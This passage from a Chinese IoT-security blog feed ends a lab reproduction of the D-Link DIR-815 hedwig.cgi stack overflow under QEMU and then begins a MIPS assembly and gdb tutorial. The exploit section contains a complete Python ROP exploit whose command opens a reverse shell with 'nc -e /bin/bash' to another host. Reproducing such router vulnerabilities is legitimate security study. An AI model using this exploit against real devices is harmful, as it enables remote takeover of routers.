/lib/</span><br><span class="line">cp lib/libgcc_s.so  /lib/</span><br><span class="line">cp lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line">cd /</span><br><span class="line">rm -rf /htdocs/web/hedwig.cgi</span><br><span class="line">rm -rf /usr/sbin/phpcgi</span><br><span class="line">rm -rf /usr/sbin/hnap</span><br><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure><p>æœ€åè¿›åˆ° <code>/squashfs-root/sbin</code> ç›®å½•ä¸‹ï¼Œæ‰§è¡Œ <code>./httpd -f /root/squashfs-root/http_conf</code></p><p>åœ¨å®¿ä¸»æœºä¸­è®¿é—® <code>http://10.214.140.139/hedwig.cgi</code> å‘ç°å¯ä»¥æ­£å¸¸è®¿é—®äº†ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305220922344.png" alt="image-20230522092237155"></p><p>å¼€å¯ <code>httpd</code> æœåŠ¡åï¼Œå¦‚æœè¦è¿›è¡Œè°ƒè¯•åˆ™éœ€è¦ä¸‹è½½ä¸€ä¸ª <a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver">gdbserver.mipsle</a> ï¼Œç„¶åå†ç”¨ <code>scp</code> å‘½ä»¤å°†å…¶ä¸Šä¼ åˆ° <code>qemu</code> ä¸­çš„ <code>/root/squashfs-root/</code> ç›®å½•ä¸‹ã€‚</p><p>åœ¨ <code>qemu</code> ä¸­ <code>/root/squashfs-root/</code> ç›®å½•ä¸‹æ–°å»º <code>run.sh</code> è„šæœ¬ï¼ˆ<code>IP</code> æ”¹æˆå®¿ä¸»æœºçš„ï¼Œç«¯å£ï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">export CONTENT_LENGTH=&quot;11&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat payload`&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;2333&quot;</span><br><span class="line">echo &quot;winmt=pwner&quot;|./gdbserver.mipsle 10.214.140.140:7788 /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;winmt=pwner&quot;</span>|/htdocs/web/hedwig.cgi</span></span><br><span class="line">unset CONTENT_LENGTH</span><br><span class="line">unset CONTENT_TYPE</span><br><span class="line">unset HTTP_COOKIE</span><br><span class="line">unset REQUEST_METHOD</span><br><span class="line">unset REQUEST_URI</span><br></pre></td></tr></table></figure><p>æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥æ˜¯èƒ½ä»å®¿ä¸»æœºä¸­è°ƒè¯• <code>qemu</code> ä¸­çš„ç¨‹åºï¼Œä½†æˆ‘è¿™é‡ŒæŠ¥äº†è¿™ä¸ªé”™è¯¯ï¼ˆæŠ˜è…¾äº†å¾ˆä¹…ä¹Ÿæ²¡æœ‰è§£å†³ï¼Œäºæ˜¯å°±æš‚æ—¶æ”¾å¼ƒäº†è¿œç¨‹è°ƒè¯•çš„æƒ³æ³•ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305221824553.png" alt="image-20230522182439980" style="zoom:50%;" /><p>ä¸è¿‡è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•ä¹Ÿèƒ½ç¡®å®š <code>libc</code> åŸºåœ°å€ï¼Œå°±æ˜¯ç”¨è¿è¡Œ <code>hedwig.cgi</code> åè¿›è¡Œåå°æŒ‚èµ·ï¼Œç„¶åç”¨ <code>cat /proc/pid/maps</code> æŸ¥çœ‹ï¼Œå…ˆè·‘å‡ æ¬¡ç¨‹åºï¼Œå‘ç° <code>pid</code> çš„å¢é•¿æ˜¯æœ‰è§„å¾‹çš„ï¼Œäºæ˜¯æå‰é¢„æµ‹ä¸€ä¸‹ï¼Œå¤šå°è¯•å‡ æ¬¡å°±èƒ½æ‰“å°å‡ºæ¥å†…å­˜å¸ƒå±€è·å– <code>libc</code> åŸºåœ°å€ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305221542829.png" alt="image-20230522154245358"></p><p>å› ä¸ºæ²¡æ³•è°ƒè¯•ï¼Œè¿™é‡Œå°±ç›´æ¥ç”¨ç½‘ä¸Šå¸ˆå‚…çš„è„šæœ¬æ‰“äº†ï¼ˆä¸»è¦ç”¨æˆ·æ¨¡å¼å·²ç»å†™äº†å¥½å‡ ç§è„šæœ¬ï¼Œè¿™ä¸ªæ²¡æ³•è°ƒè¯•çš„é—®é¢˜æ­»æ´»è§£å†³ä¸äº†ï¼Œå¯¼è‡´äº†æ²¡æ³•è°ƒè¯• <code>rop</code>çš„å¸ƒå±€ï¼‰æ€è·¯å’Œç”¨æˆ·æ¨¡å¼ <code>ROP-system</code> çš„é‚£ä¸ªè„šæœ¬æ˜¯ä¸€æ ·çš„ï¼Œå°±æŠŠå‘½ä»¤æ¢æˆåå¼¹ <code>shell</code> çš„å‘½ä»¤å³å¯</p><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload</span>(<span class="params">offset, libc_base, cmd</span>):</span><br><span class="line">    Calcsystem = <span class="number">0x158c8</span>    <span class="comment"># $s0 add 1, jalr $s5</span></span><br><span class="line">    Callsystem = <span class="number">0x159cc</span>    <span class="comment"># &#x27;/bin/sh&#x27; -&gt; $a0, jalr system</span></span><br><span class="line">    system_addr_1 = <span class="number">0x53200</span> - <span class="number">1</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * offset  <span class="comment"># 973</span></span><br><span class="line">    payload += p32(libc_base + system_addr_1)  <span class="comment"># s0     977</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s1     981</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s2     985</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s3     989</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s4     993</span></span><br><span class="line">    payload += p32(libc_base + Callsystem)     <span class="comment"># s5     997</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s6     1001</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s7     1005</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># fp     1009</span></span><br><span class="line">    payload += p32(libc_base + Calcsystem)     <span class="comment"># ra</span></span><br><span class="line">    payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">    payload += cmd</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">b&quot;nc -e /bin/bash 10.214.140.144 7788&quot;</span></span><br><span class="line">    cookie = <span class="string">b&#x27;uid=&#x27;</span> + get_payload(<span class="number">973</span>, <span class="number">0x2aaf8000</span>, cmd)</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: cookie,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;100&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;x&#x27;</span>&#125;</span><br><span class="line">    ip_port = sys.argv[<span class="number">1</span>]</span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + ip_port + <span class="string">&quot;/hedwig.cgi&quot;</span></span><br><span class="line">    r = requests.post(url=url, headers=header, data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯å·²ç»å°† <code>qemu</code> ä¸­æ¨¡æ‹Ÿçš„ç¯å¢ƒ <code>shell</code> åå¼¹åˆ°äº†å®¿ä¸»æœºä¸Šã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305221606264.png" alt="image-20230522160633923"></p><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a href="https://bbs.kanxue.com/thread-272318.htm">ä»é›¶å¼€å§‹å¤ç° DIR-815 æ ˆæº¢å‡ºæ¼æ´-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><p><a href="https://www.cnblogs.com/unr4v31/p/16072562.html">DLink 815è·¯ç”±å™¨æ ˆæº¢å‡ºæ¼æ´åˆ†æä¸å¤ç° - unr4v31 - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/qq_44223394/article/details/128756188">ä»é›¶åˆ°ä¸€ï¼šå¤ç° DIR-815 æ ˆæº¢å‡ºæ¼æ´_Y6blNU1Lçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/jasonactions/article/details/118931633">qemuä¸å®¿ä¸»æœºç½‘ç»œé€šä¿¡é…ç½®_ubuntuä¸»æœºå’Œqemuç½‘ç»œäº’é€š_HZero.chençš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> IOTå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MIPSæ¶æ„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOTå®‰å…¨å…¥é—¨å­¦ä¹ --MIPSæ±‡ç¼–åŸºç¡€</title>
      <link href="/posts/919c29c4.html"/>
      <url>/posts/919c29c4.html</url>
      
        <content type="html"><![CDATA[<h3 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h3><p>è¯´ä¸‹å­¦ä¹  <code>MIPS</code> æ±‡ç¼–åŸºç¡€çš„æ€è·¯ï¼Œä½œä¸ºä¸€ä¸ªæ¥è§¦æ–°çŸ¥è¯†é¢çš„å°ç™½ï¼Œæˆ‘é¦–å…ˆå»æŸ¥äº†ä¸€ä¸‹å¦‚ä½•ç¼–è¯‘ <code>MIPS</code> æ¶æ„çš„ç¨‹åºï¼Œç„¶åè‡ªå·±å†™äº†ä¸€ä¸ªç®€å•çš„ä»£ç ï¼Œæ”¾å…¥ <code>IDA</code> åå¼€å§‹è¿›è¡Œæ±‡ç¼–ä»£ç çš„å­¦ä¹ ï¼Œé‡è§ä¸€æ¡æŒ‡ä»¤å°±å­¦ä¹ ä¸€æ¡æŒ‡ä»¤ï¼Œä¸ºäº†è§‚å¯Ÿæ›´ç»†è‡´çš„å†…å­˜å˜åŒ–åŒæ—¶è¿˜è¦å­¦ä¹ å¦‚ä½•ç”¨ <code>gdb</code> æ¥è¿›è¡Œ <code>MIPS</code> æ¶æ„ç¨‹åºçš„è°ƒè¯•ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è®°å½•è§åˆ°çš„æ±‡ç¼–æŒ‡ä»¤å’Œå¯„å­˜å™¨ç­‰ç­‰ï¼Œæ¥ç€æ˜¯å‡½æ•°è°ƒç”¨çº¦å®šçš„å­¦ä¹ ï¼Œå‚è€ƒç€ç½‘ä¸Šçš„æ–‡ç« å†ç»“åˆ <code>gdb</code> è°ƒè¯•åŸºæœ¬å°±èƒ½ç†è§£é€å½»ã€‚æ„Ÿè§‰å¯¹ <code>MIPS</code> æ±‡ç¼–åŸºç¡€å’Œå‡½æ•°è°ƒç”¨çº¦å®šå·²ç»å¾—å¿ƒåº”æ‰‹ï¼Œå°±å¯ä»¥åšä¸€äº› <code>PWN</code> é¢˜ä»¥æ­¤æ¥ç¨³å›ºæ‰“ä¸‹çš„åŸºç¡€ï¼Œæœ€åå°è¯•æ¥æ‰‹å†™å„ç§çš„ <code>shellcode</code>ã€‚å¸Œæœ›è¿™ä¸ªæ€è·¯èƒ½ç»™ä¹‹åè‡ªå­¦è€…ä¸€ç‚¹å€Ÿé‰´ã€‚</p><p>ä¸‹é¢å…ˆè®©æˆ‘ä»¬ç¼–è¯‘è¿è¡Œè‡ªå·±çš„ç¬¬ä¸€ä¸ª <code>MIPS</code> æ¶æ„çš„ç¨‹åº</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mips-linux-gnu-gcc demo.c -o demo -static -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> value=a+b;</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> c=sum(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;value ==&gt; %d\n&quot;</span>,c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¯åŠ¨ä¸è°ƒè¯•"><a href="#å¯åŠ¨ä¸è°ƒè¯•" class="headerlink" title="å¯åŠ¨ä¸è°ƒè¯•"></a>å¯åŠ¨ä¸è°ƒè¯•</h3><h4 id="å¯åŠ¨"><a href="#å¯åŠ¨" class="headerlink" title="å¯åŠ¨"></a>å¯åŠ¨</h4><p>å¦‚æœæ˜¯å°ç«¯åºçš„ç¨‹åºä½¿ç”¨ <code>qemu-mipsel ./xxx</code> è¿è¡Œç¨‹åºï¼Œå¦‚æœæ˜¯å¤§ç«¯åºçš„ç¨‹åºç”¨ <code>qemu-mips ./xxx</code> è¿è¡Œç¨‹åº </p><p>è¡¥å……ï¼š</p><ol><li>å¦‚æœè¿è¡ŒåŠ¨æ€é“¾æ¥çš„ç¨‹åºï¼Œå¯èƒ½ä¼šé‡è§ä¸€äº›æŠ¥é”™ï¼Œ è¿™é‡Œçš„ <a href="#%E8%A7%A3%E5%86%B3%E6%8A%A5%E9%94%99">è§£å†³æ–¹æ³•</a> æˆ–è®¸ä¼šå¯¹ä½ æœ‰æ‰€å¸®åŠ©</li><li>ä½¿ç”¨ <code>readelf -h xxx</code> å¯ä»¥æŸ¥çœ‹ç¨‹åºçš„å­—èŠ‚åº</li></ol><h4 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h4><p>è°ƒè¯•åˆ†ä¸º <strong>ç›´æ¥è°ƒè¯•ç¨‹åº</strong>  å’Œ <strong>åŠ è½½è¿›ç¨‹è°ƒè¯•</strong></p><h5 id="ç›´æ¥è°ƒè¯•ç¨‹åº"><a href="#ç›´æ¥è°ƒè¯•ç¨‹åº" class="headerlink" title="ç›´æ¥è°ƒè¯•ç¨‹åº"></a>ç›´æ¥è°ƒè¯•ç¨‹åº</h5><p>å‡è®¾è¦è°ƒè¯•çš„ç¨‹åºå«åš <code>demo</code> ï¼ˆå¤§ç«¯åºï¼‰ï¼Œé‚£ä¹ˆåœ¨ç»ˆç«¯æ‰§è¡Œ <code>qemu-mips -g 1234 ./demo</code></p><p>ç„¶åå†å¼€ä¸€ä¸ªç»ˆç«¯æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼ˆ<code>set endian big</code> è¿™é‡Œæ˜¯è®¾ç½®ä¸ºå¤§ç«¯åºï¼Œå¦‚æœæ˜¯å°ç«¯åºçš„è¯è®¾ç½®ä¸º <code>little</code> ï¼Œå¦‚æœæƒ³åŠ è½½ç¨‹åºç¬¦å·è¡¨çš„è¯ï¼Œå†æ·»åŠ ä¸€ä¸ª <code>symbol-file ./demo</code>ï¼‰ </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">set architecture mips</span><br><span class="line">set endian big</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure><p>å®é™…è°ƒè¯•æƒ…å†µå¦‚ä¸‹å›¾ï¼Œå¦‚æ­¤å°±å¯ä»¥è¿›å…¥åˆ° <code>gdb</code> çš„è°ƒè¯•ç•Œé¢äº†</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112120319.png" alt="image-20230511212044987"></p><p>å¦‚æœæ„Ÿè§‰æ¯æ¬¡éƒ½è¦æ•²è¿™å‡ æ¡å‘½ä»¤æœ‰ç‚¹éº»çƒ¦çš„è¯ï¼Œå¯ä»¥ç¼–å†™ä¸€ä¸ª <code>shell</code> è„šæœ¬æ¥ç®€åŒ–å·¥ä½œï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå«åš <code>loader.sh</code> è„šæœ¬ï¼Œç¼–å†™å†…å®¹å¦‚ä¸‹ï¼ˆçº¯å±ä¸¾ä¾‹ï¼Œå…·ä½“æƒ…å†µå…·ä½“å¤„ç†ï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set architecture mips</span><br><span class="line">set endian little</span><br><span class="line">symbol-file ./pwn2</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬åªéœ€è¦æ‰§è¡Œ <code>gdb-multiarch</code> åï¼Œæ‰§è¡Œä¸€æ¬¡ <code>source loader.sh </code> å‘½ä»¤å³å¯ã€‚</p><h5 id="åŠ è½½è¿›ç¨‹è°ƒè¯•"><a href="#åŠ è½½è¿›ç¨‹è°ƒè¯•" class="headerlink" title="åŠ è½½è¿›ç¨‹è°ƒè¯•"></a>åŠ è½½è¿›ç¨‹è°ƒè¯•</h5><p>è¿™ä¸ªé€šå¸¸ç”¨äºæˆ‘ä»¬ç¼–å†™æ”»å‡»è„šæœ¬åï¼Œéœ€è¦è¿›è¡Œè°ƒè¯•åˆ¤æ–­æ•°æ®æ˜¯å¦æ˜¯é¢„æœŸçš„é‚£æ ·ã€‚</p><p>åªéœ€è¦åœ¨ <code>EXP</code> ä¸­ç¼–å†™ä»£ç  <code>p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./demo&quot;])</code> å³å¯ï¼Œè¿™å…¶å®ä¼ å…¥è¿›å»çš„å°±æ˜¯ä¸€ä¸ªå‘½ä»¤åŒ…æ‹¬å‚æ•°åˆ—è¡¨ã€‚æ­£å¸¸è¿è¡Œç¨‹åºä¹Ÿæ˜¯åŒç† <code>p=process([&quot;qemu-mips&quot;,&quot;./demo&quot;])</code></p><p>å‰©ä¸‹çš„ä¾æ—§æ˜¯æ–°å¼€ä¸€ä¸ªç»ˆç«¯æ‰§è¡Œ <code>gdb-multiarch</code> å‘½ä»¤ç­‰ç­‰ï¼ˆåŒä¸Šï¼‰</p><h3 id="æ±‡ç¼–æŒ‡ä»¤"><a href="#æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="æ±‡ç¼–æŒ‡ä»¤"></a>æ±‡ç¼–æŒ‡ä»¤</h3><p><code>li</code> (Load Immediate)æŒ‡ä»¤ç”¨äºå°†ä¸€ä¸ªç«‹å³æ•°å­˜å…¥ä¸€ä¸ªé€šç”¨å¯„å­˜å™¨,<code>li   $gp, 0x498300</code> å°† <code>$gp</code> å¯„å­˜å™¨çš„å€¼èµ‹å€¼ä¸º <code>0x498300</code></p><p><code>lui</code> æŒ‡ä»¤å°†ä¸€ä¸ª <code>16</code> ä½çš„ç«‹å³æ•°å·¦ç§» <code>16</code> ä½åå­˜å…¥ç›®æ ‡å¯„å­˜å™¨ä¸­ï¼Œ <code>lui   $v0, 0x46</code> æ˜¯å°† <code>0x46</code> ç«‹å³æ•°å·¦ç§»  <code>16</code> ä½åå­˜å…¥ <code>$v0</code> å¯„å­˜å™¨ï¼Œå³ <code>$v0</code> å¯„å­˜å™¨çš„å€¼ä¸º <code>0x460000</code></p><p><code>ori</code> æŒ‡ä»¤æ˜¯ <code>MIPS</code> æ±‡ç¼–ä¸­çš„ä¸€ç§é€»è¾‘è¿ç®—æŒ‡ä»¤ï¼Œå®ƒå¯ä»¥å°†ä¸€ä¸ªå¯„å­˜å™¨çš„ä½ 16 ä½ä¸ä¸€ä¸ª 16 ä½çš„ç«‹å³æ•°æŒ‰ä½æˆ–è¿ç®—ï¼Œå¹¶å°†ç»“æœå­˜å…¥å¦ä¸€ä¸ªå¯„å­˜å™¨ä¸­ã€‚<code>ori $t6,$t6,0x430a</code> æŒ‡ä»¤å°† <code>t6</code> å¯„å­˜å™¨ä¸ <code>0x430a</code> ç«‹å³æ•°è¿›è¡Œæˆ–è¿ç®—ï¼Œå°†ç»“æœæ”¾å› <code>$t6</code></p><p><code>la</code> (Load Address) æŒ‡ä»¤ç”¨äºå°†ä¸€ä¸ªåœ°å€æˆ–æ ‡ç­¾å­˜å…¥ä¸€ä¸ªå¯„å­˜å™¨ï¼Œ<code>la $v0, puts</code> æŒ‡ä»¤å°† <code>puts</code> å‡½æ•°åœ°å€å­˜å…¥ <code>$v0</code> å¯„å­˜å™¨ä¸­</p><p><code>lw</code> (Load Word) æŒ‡ä»¤ç”¨äº<strong>ä»ä¸€ä¸ªæŒ‡å®šçš„åœ°å€åŠ è½½ä¸€ä¸ª <code>word</code> ç±»å‹çš„å€¼</strong>åˆ°ä¸€ä¸ªå¯„å­˜å™¨     <code>lw $v0, 0x14($fp)</code> å°† <code>$fp+0x14</code> çš„ä½ç½®ä¸­çš„æ•°æ®å­˜å…¥åˆ° <code>v0</code> ä¸­</p><p><code>sw</code> (Store Word) å°†æºå¯„å­˜å™¨ä¸­çš„å€¼å­˜å…¥æŒ‡å®šåœ°å€ï¼Œ<code>sw   $ra, 0x24($sp) </code> å°† <code>$ra</code> çš„å€¼å†™å…¥è·ç¦»æ ˆé¡¶ï¼ˆ<code>$sp</code>ï¼‰åç§» <code>0x24</code> çš„å†…å­˜å•å…ƒä¸­</p><p><code>move</code> æŒ‡ä»¤ç”¨äºå¯„å­˜å™¨ä¹‹é—´å€¼çš„ä¼ é€’ï¼Œ<code>move   $t5,$t1</code> å°† <code>$t1</code> èµ‹å€¼ç»™ <code>$5</code> </p><p><code>addi</code> æŒ‡ä»¤ç”¨äºè®¡ç®—ä¸€ä¸ªå¯„å­˜å™¨åŠ ä¸Šä¸€ä¸ªç«‹å³æ•°ï¼Œ<code>addi $t0,$t1,5</code> å°† <code>$t1</code> åŠ ä¸Š <code>5</code> ä¹‹åå°†ç»“æœæ”¾ä¸º <code>$t0</code></p><p><code>addu</code> æŒ‡ä»¤ç”¨äºè®¡ç®—æ— ç¬¦å·æ•°ä¹‹é—´è¿›è¡Œçš„åŠ æ³•æ“ä½œï¼Œ<code>addu $t0,$t1,$t2</code> å°† <code>$t1</code> å’Œ <code>$t2</code> è¿›è¡Œæ— ç¬¦å·ç›¸åŠ ï¼Œç»“æœå­˜å‚¨åœ¨ <code>$t0</code></p><p><code>add</code> æŒ‡ä»¤å’Œ <code>addu</code> ä¸€æ ·ï¼Œåªä¸è¿‡è¿›è¡Œçš„æ˜¯æœ‰ç¬¦å·æ•°ä¹‹é—´çš„åŠ æ³•ã€‚</p><p><code>addiu</code> æŒ‡ä»¤å°†ä¸Šé¢çš„ <code>addi</code> å’Œ <code>addu</code> ç»“åˆäº†ä¸€ä¸‹ï¼Œ<code> addiu  $a1, $zero, 2</code> è¿›è¡Œçš„æ˜¯å°†å¯„å­˜å™¨<code>$zero</code> åŠ ä¸Šä¸€ä¸ªç«‹å³æ— ç¬¦å·æ•° <code>2</code> ï¼Œå¹¶å°†ç»“æœå­˜å›å¯„å­˜å™¨ <code>$a1</code> ä¸­</p><p><code>jr</code> æ˜¯è·³è½¬æŒ‡ä»¤ï¼Œ<code>jar $ra</code> è·³è½¬åˆ° <code>$ra</code> å¯„å­˜å™¨æŒ‡å‘çš„åœ°å€å¤„</p><p><code>jal</code> æŒ‡ä»¤æ˜¯è·³è½¬æŒ‡ä»¤ï¼Œ<code>jal target</code> å¤åˆ¶å½“å‰çš„ <code>PC</code> å€¼åˆ° <code>$ra</code> å¯„å­˜å™¨ï¼Œç„¶åè·³è½¬åˆ° <code>target</code> å¤„</p><p><code>bnez</code> æŒ‡ä»¤ç”¨äºåœ¨å¯„å­˜å™¨çš„å€¼ä¸ä¸ºé›¶æ—¶è¿›è¡Œåˆ†æ”¯è·³è½¬ï¼Œ<code>bnez   $v0, loc_4005E8</code> è¡¨ç¤ºå½“ <code>$v0</code> ä¸ä¸ºé›¶æ—¶è·³è½¬åˆ° <code>0x4005E8</code> </p><p><code>b</code> æ˜¯æ— æ¡ä»¶è·³è½¬æŒ‡ä»¤ï¼Œ<code>b loc_400604</code>  ç›´æ¥è·³è½¬åˆ° <code>0x400604</code> åœ°å€å¤„</p><h3 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h3><h4 id="é€šç”¨å¯„å­˜å™¨"><a href="#é€šç”¨å¯„å­˜å™¨" class="headerlink" title="é€šç”¨å¯„å­˜å™¨"></a>é€šç”¨å¯„å­˜å™¨</h4><p>åœ¨ <code>MIPS</code> ä½“ç³»ç»“æ„ä¸­æœ‰ <code>32</code> ä¸ªé€šç”¨å¯„å­˜å™¨ï¼Œåœ¨æ±‡ç¼–ç¨‹åºä¸­å¯ä»¥ç”¨ç¼–å· <code>$0-$31</code>è¡¨ç¤ºï¼Œä¹Ÿå¯ä»¥ç”¨å¯„å­˜å™¨çš„åå­—è¡¨ç¤º</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305111218207.png" alt="image-20230511121821077" style="zoom:50%;" /><h4 id="ç‰¹æ®Šå¯„å­˜å™¨"><a href="#ç‰¹æ®Šå¯„å­˜å™¨" class="headerlink" title="ç‰¹æ®Šå¯„å­˜å™¨"></a>ç‰¹æ®Šå¯„å­˜å™¨</h4><p><code>MIPS</code> æ¶æ„ä¸­å®šä¹‰äº† <code>3</code> ä¸ªç‰¹æ®Šçš„å¯„å­˜å™¨ï¼Œåˆ†åˆ«æ˜¯ <code>PC</code>ï¼ˆç¨‹åºè®¡æ•°å™¨ï¼‰ã€<code>HI</code> (ä¹˜é™¤ç»“æœé«˜ä½å¯„å­˜å™¨)ã€<code>LO</code>ï¼ˆä¹˜é™¤ç»“æœä½ä½å¯„å­˜å™¨ï¼‰ã€‚åœ¨è¿›è¡Œä¹˜æ³•è¿ç®—æ—¶ï¼Œ <code>HI</code> å’Œ <code>LO</code> ä¿å­˜ä¹˜æ³•çš„è¿ç®—ç»“æœï¼Œå…¶ä¸­ <code>HI</code> å­˜å‚¨é«˜ <code>32</code> ä½ï¼Œ<code>LO</code> å­˜å‚¨ä½ <code>32</code> ä½ï¼›åœ¨è¿›è¡Œé™¤æ³•è¿ç®—æ—¶ï¼Œ <code>HI</code> ä¿å­˜ä½™æ•°ï¼Œ <code>LO</code> å­˜å‚¨å•†ã€‚</p><h3 id="MIPS32-æ¶æ„çŸ¥è¯†"><a href="#MIPS32-æ¶æ„çŸ¥è¯†" class="headerlink" title="MIPS32 æ¶æ„çŸ¥è¯†"></a><code>MIPS32</code> æ¶æ„çŸ¥è¯†</h3><ul><li><p><code>MIPS</code> å›ºå®š <code>4</code> å­—èŠ‚æŒ‡ä»¤é•¿åº¦ </p></li><li><p>æ ˆæ˜¯ä»å†…å­˜çš„é«˜åœ°å€å‘ä½åœ°å€æ–¹å‘å¢é•¿çš„</p></li><li><p>å¶å­å‡½æ•°ï¼šå‡½æ•°å†…éƒ¨æ²¡æœ‰å†è°ƒç”¨å…¶ä»–å‡½æ•°</p></li><li><p>éå¶å­å‡½æ•°ï¼šå‡½æ•°å†…éƒ¨è°ƒç”¨å…¶ä»–å‡½æ•°çš„å‡½æ•°</p></li><li><p>æµæ°´çº¿æ•ˆåº”ï¼šåœ¨åˆ†æ <code>MIPS</code> æ±‡ç¼–ä»£ç æ—¶ä¼šå‘ç°ï¼Œå…¶è·³è½¬åˆ°å‡½æ•°æˆ–è€…åˆ†æ”¯è·³è½¬è¯­å¥çš„ä¸‹ä¸€æ¡éƒ½æ˜¯ <code>nop</code> 